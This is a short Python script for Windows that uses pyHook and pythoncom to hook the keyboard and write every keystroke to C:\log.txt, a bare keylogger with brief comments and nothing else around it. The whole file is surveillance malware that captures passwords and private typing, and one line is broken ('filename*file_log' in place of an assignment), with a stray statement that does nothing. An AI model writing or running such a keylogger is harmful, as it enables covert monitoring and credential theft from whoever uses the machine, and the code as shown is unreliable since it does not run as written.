import pyHook, pythoncom, sys, logging
file_log='C:\\log.txt'
def OnKeyboardEvent(event):
	 logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s')
	 chr(event.Ascii)
	 logging.log(10,chr(event.Ascii))
	 return True

#instantiate HookManager class
hooks_manager = pyHook.HookManager ()

#listen to all keystrokes
hooks_manager.KeyDown = OnKeyboardEvent

#hook the keyboard
hooks_manager.HookKeyboard ()

#Pump all messages for current thread 
pythoncom.PumpMessages ()